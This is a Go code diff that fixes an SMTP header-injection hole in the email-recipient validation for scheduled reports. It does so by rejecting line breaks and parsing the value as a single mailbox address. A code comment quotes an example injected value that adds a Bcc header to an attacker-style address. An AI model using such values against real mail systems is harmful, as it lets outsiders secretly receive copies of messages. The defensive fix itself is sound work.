@@ -4,6 +4,7 @@ import (
 	"context"
 	"errors"
 	"net/http"
+	"net/mail"
 	"strings"
 	"time"
 
@@ -146,8 +147,17 @@ func (s *Server) validateScheduledReportRequest(
 				return nil, false
 			}
 		case scheduledreports.RecipientEmail:
-			if !strings.Contains(r.Value, "@") {
-				writeError(w, http.StatusBadRequest, "an email recipient value must be an email address")
+			// Validate as a real, single mailbox address. mail.ParseAddress rejects
+			// embedded CR/LF and multi-address values, closing an SMTP header-injection
+			// vector: a raw `victim@x\r\nBcc: exfil@evil.com` would otherwise pass a
+			// naive "contains @" check and be written verbatim into the To: header at
+			// delivery, smuggling extra headers into the outbound message.
+			if strings.ContainsAny(r.Value, "\r\n") {
+				writeError(w, http.StatusBadRequest, "an email recipient value must not contain line breaks")
+				return nil, false
+			}
+			if _, perr := mail.ParseAddress(strings.TrimSpace(r.Value)); perr != nil {
+				writeError(w, http.StatusBadRequest, "an email recipient value must be a valid email address")
 				return nil, false
 			}
 		default:
